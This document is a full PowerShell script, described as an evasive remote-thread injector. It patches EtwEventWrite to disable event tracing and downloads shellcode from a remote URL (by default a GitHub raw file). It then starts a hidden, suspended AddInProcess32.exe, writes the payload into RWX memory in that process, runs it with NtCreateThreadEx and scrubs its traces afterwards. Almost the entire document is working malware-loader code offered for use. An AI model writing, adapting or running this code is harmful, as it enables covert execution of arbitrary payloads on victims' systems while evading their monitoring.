#requires -Version 4
<#
.SYNOPSIS
    Evasive PowerShell remote-thread injector with ETW blindfolding.
.DESCRIPTION
    - Patches EtwEventWrite in the current process.
    - Downloads raw shellcode into a transient heap byte array.
    - Spawns a hidden AddInProcess32.exe host.
    - Allocates RWX memory remotely and writes the payload.
    - Executes via NtCreateThreadEx.
    - Emits verbose custom timestamps, then scrubs local references and forces GC.
.PARAMETER ShellcodeUrl
    URL pointing to the raw x86 shellcode bytes.
.PARAMETER HostProcess
    32-bit host to spawn. Defaults to Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe.
.EXAMPLE
    .\remote_thread_injector.ps1 -ShellcodeUrl "http://192.168.1.10/payload.bin"
#>
[CmdletBinding()]
param (
    [Parameter(Mandatory = $false, Position = 0)]
    [string]$ShellcodeUrl = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin",

    [Parameter(Mandatory = $false)]
    [string]$HostProcess = ""
)

# ---------------------------------------------------------------------------
# P/Invoke definitions
# ---------------------------------------------------------------------------
$TypeSource = @"
using System;
using System.Runtime.InteropServices;

public class RTI {
    // Kernel32
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    // ntdll
    [DllImport("ntdll.dll")]
    public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UIntPtr NumberOfBytesToWrite, out UIntPtr NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr BytesBuffer);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
}
"@

Add-Type -TypeDefinition $TypeSource -Language CSharp -ErrorAction SilentlyContinue | Out-Null

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
$PAGE_EXECUTE_READWRITE = 0x40
$PAGE_READWRITE         = 0x04
$MEM_COMMIT             = 0x1000
$MEM_RESERVE            = 0x2000
$CREATE_NO_WINDOW       = 0x08000000
$CREATE_SUSPENDED       = 0x00000004
$THREAD_ALL_ACCESS      = 0x1FFFFF

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
function Get-VerboseTimestamp {
    $now = [DateTime]::Now
    $tz  = [System.TimeZoneInfo]::Local.StandardName
    return "[{0:yyyy-MM-dd}] [{0:HH:mm:ss.fff}] [{1}] [{2}]" -f $now, $now.DayOfWeek, $tz
}

function Write-StampedHost {
    param([string]$Message)
    Write-Host "$(Get-VerboseTimestamp) $Message" -ForegroundColor Cyan
}

function Write-StampedHostSuccess {
    param([string]$Message)
    Write-Host "$(Get-VerboseTimestamp) $Message" -ForegroundColor Green
}

function Write-StampedHostWarning {
    param([string]$Message)
    Write-Host "$(Get-VerboseTimestamp) $Message" -ForegroundColor Yellow
}

# ---------------------------------------------------------------------------
# 1. Disable ETW in current PowerShell session
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Locating EtwEventWrite inside ntdll.dll..."
$ntdll = [RTI]::GetModuleHandle("ntdll.dll")
if ($ntdll -eq [IntPtr]::Zero) {
    throw "Failed to get ntdll.dll module handle"
}

$etw = [RTI]::GetProcAddress($ntdll, "EtwEventWrite")
if ($etw -eq [IntPtr]::Zero) {
    throw "Failed to resolve EtwEventWrite"
}

$patch = [byte[]]@(0xC3)  # ret
$oldProtect = 0
Write-StampedHost "[*] Patching ETW logging routine at 0x$($etw.ToString('X'))..."
$vp = [RTI]::VirtualProtect($etw, [UIntPtr]::new($patch.Length), $PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
if (-not $vp) {
    throw "VirtualProtect failed while patching ETW"
}
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etw, $patch.Length)
[void][RTI]::VirtualProtect($etw, [UIntPtr]::new($patch.Length), $oldProtect, [ref]$oldProtect)
Write-StampedHostSuccess "[+] ETW EventWrite blindfolded in current process"

# ---------------------------------------------------------------------------
# 2. Fetch shellcode into a heap-staged byte array
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Retrieving remote shellcode from $ShellcodeUrl ..."
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win32; x32) AppleWebKit/537.36")
    [byte[]]$shellcode = $wc.DownloadData($ShellcodeUrl)
    $wc.Dispose()
    Write-StampedHostSuccess "[+] Downloaded $($shellcode.Length) bytes into transient heap buffer"
}
catch {
    throw "Shellcode download failed: $_"
}

if ($shellcode.Length -eq 0) {
    throw "Shellcode buffer is empty"
}

# ---------------------------------------------------------------------------
# 3. Use AddInProcess32.exe as the hidden x86 host
# ---------------------------------------------------------------------------
if ([string]::IsNullOrEmpty($HostProcess)) {
    $HostProcess = Join-Path $env:SystemRoot "Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe"
}

if (-not (Test-Path -LiteralPath $HostProcess)) {
    throw "AddInProcess32.exe not found at $HostProcess"
}

Write-StampedHost "[*] Spawning hidden host process: $HostProcess"
$si = New-Object RTI+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$si.dwFlags = 0x00000001  # STARTF_USESHOWWINDOW
$si.wShowWindow = 0       # SW_HIDE

$pi = New-Object RTI+PROCESS_INFORMATION

$created = [RTI]::CreateProcessW(
    $HostProcess,
    $null,
    [IntPtr]::Zero,
    [IntPtr]::Zero,
    $false,
    ($CREATE_NO_WINDOW -bor $CREATE_SUSPENDED),
    [IntPtr]::Zero,
    $env:TEMP,
    [ref]$si,
    [ref]$pi
)

if (-not $created) {
    throw "CreateProcessW failed for host process"
}

Write-StampedHostSuccess "[+] Host process created PID=$($pi.dwProcessId)"

# ---------------------------------------------------------------------------
# 4. Allocate RWX buffer in remote process
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Allocating RWX remote buffer of size $($shellcode.Length) bytes..."
$baseAddr = [IntPtr]::Zero
$regionSize = [UIntPtr]::new($shellcode.Length)
$status = [RTI]::NtAllocateVirtualMemory(
    $pi.hProcess,
    [ref]$baseAddr,
    [IntPtr]::Zero,
    [ref]$regionSize,
    ($MEM_COMMIT -bor $MEM_RESERVE),
    $PAGE_EXECUTE_READWRITE
)

if ($status -ne 0) {
    [void][RTI]::CloseHandle($pi.hThread)
    [void][RTI]::CloseHandle($pi.hProcess)
    throw "NtAllocateVirtualMemory failed NTSTATUS=0x$($status.ToString('X8'))"
}

Write-StampedHostSuccess "[+] Remote RWX buffer allocated at 0x$($baseAddr.ToString('X8'))"

# ---------------------------------------------------------------------------
# 5. Write payload into remote buffer
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Writing payload into remote process..."
$written = [UIntPtr]::Zero
$status = [RTI]::NtWriteVirtualMemory(
    $pi.hProcess,
    $baseAddr,
    $shellcode,
    [UIntPtr]::new($shellcode.Length),
    [ref]$written
)

if ($status -ne 0) {
    [void][RTI]::CloseHandle($pi.hThread)
    [void][RTI]::CloseHandle($pi.hProcess)
    throw "NtWriteVirtualMemory failed NTSTATUS=0x$($status.ToString('X8'))"
}

Write-StampedHostSuccess "[+] Wrote $($written.ToUInt64()) bytes to remote process"

# ---------------------------------------------------------------------------
# 6. Trigger execution via NtCreateThreadEx
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Creating remote thread at 0x$($baseAddr.ToString('X8'))..."
$hThread = [IntPtr]::Zero
$status = [RTI]::NtCreateThreadEx(
    [ref]$hThread,
    $THREAD_ALL_ACCESS,
    [IntPtr]::Zero,
    $pi.hProcess,
    $baseAddr,
    [IntPtr]::Zero,
    $false,
    0,
    0,
    0,
    [IntPtr]::Zero
)

if ($status -ne 0) {
    [void][RTI]::CloseHandle($pi.hThread)
    [void][RTI]::CloseHandle($pi.hProcess)
    throw "NtCreateThreadEx failed NTSTATUS=0x$($status.ToString('X8'))"
}

Write-StampedHostSuccess "[+] Remote thread created handle=0x$($hThread.ToString('X'))"

# ---------------------------------------------------------------------------
# 7. Cleanup handles
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Closing process/thread handles..."
[void][RTI]::CloseHandle($hThread)
[void][RTI]::CloseHandle($pi.hThread)
[void][RTI]::CloseHandle($pi.hProcess)
Write-StampedHostSuccess "[+] Handles released"

# ---------------------------------------------------------------------------
# 8. Scrub local footprint
# ---------------------------------------------------------------------------
Write-StampedHost "[*] Scrubbing local shellcode buffer and forcing garbage collection..."
for ($i = 0; $i -lt $shellcode.Length; $i++) {
    $shellcode[$i] = 0
}
$shellcode = $null
$wc = $null
$TypeSource = $null
[GC]::Collect()
[GC]::WaitForPendingFinalizers()
[GC]::Collect()
Write-StampedHostSuccess "[+] Local memory footprint erased"

Write-StampedHostSuccess "[+] Injection sequence complete"
